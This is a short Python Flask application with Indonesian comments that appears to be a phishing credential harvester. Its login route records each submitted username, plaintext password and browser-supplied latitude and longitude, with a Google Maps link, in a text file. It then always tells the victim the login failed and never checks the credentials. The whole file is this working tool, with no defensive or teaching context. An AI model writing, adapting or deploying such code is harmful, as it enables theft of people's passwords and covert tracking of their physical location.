from flask import Flask, render_template, request, redirect, url_for
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        latitude = request.form.get('latitude', '')
        longitude = request.form.get('longitude', '')
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Membuat tautan Google Maps jika koordinat tersedia
        if latitude and longitude:
            location_link = f"https://www.google.com/maps?q={latitude},{longitude}"
        else:
            location_link = "Lokasi tidak tersedia"

        # Menyimpan data ke file
        with open('hasil.login.txt', 'a') as f:
            f.write(f"{timestamp} | Username: {username} | Password: {password} | Lokasi: {location_link}\n")

        return "Login gagal: Username atau password salah"

    return render_template('login.html')

if __name__ == '__main__':
    app.run(debug=True)
